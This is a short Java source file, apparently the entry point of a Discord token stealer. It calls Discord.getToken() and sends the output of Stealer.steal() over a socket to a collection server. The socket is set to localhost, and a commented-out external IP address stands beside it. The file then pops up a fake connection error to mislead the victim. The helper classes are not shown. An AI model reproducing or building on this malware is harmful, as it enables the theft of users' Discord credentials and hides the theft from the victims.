package me.mafrans.discordsw;

import me.mafrans.discordsw.stealer.Stealer;

import java.io.*;

public class Main {
    public static void main(String[] b) {
        try {

            System.out.println(Discord.getToken());
            Socketeer socketeer = new Socketeer("localhost", 1988); //107.174.70.18

            socketeer.h(Stealer.steal());

            socketeer.close();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        ErrorWindow.run("Error when establishing connection, code:0003");
    }
}
